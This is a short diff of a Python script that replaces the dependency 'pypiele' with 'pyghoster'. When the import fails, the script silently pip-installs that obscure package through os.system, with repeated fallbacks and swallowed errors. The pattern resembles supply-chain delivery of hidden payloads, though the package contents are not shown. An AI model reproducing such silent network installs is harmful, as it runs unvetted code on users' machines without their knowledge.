@@ -1,6 +1,6 @@
 import os
 try:
-    import pypiele
+    import pyghoster
     from colorama import Fore, init
     from urllib import request
     from requests import session as sesh
@@ -17,20 +17,20 @@ try:
     import ctypes
 except:
     try:
-        os.system("python.exe -m pip install pypiele")
+        os.system("python.exe -m pip install pyghoster")
         os.system("python.exe -m pip install -r requirements.txt")
     except:
         try:
-            os.system("python3 -m pip install pypiele")
+            os.system("python3 -m pip install pyghoster")
             os.system("python3 -m pip install -r requirements.txt")
         except:
             try:
-                os.system("pip install pypiele")
+                os.system("pip install pyghoster")
                 os.system("pip install -r requirements.txt")
             except:
                 pass
 
-import pypiele
+import pyghoster
 from colorama import Fore, init
 from urllib import request
 from requests import session as sesh
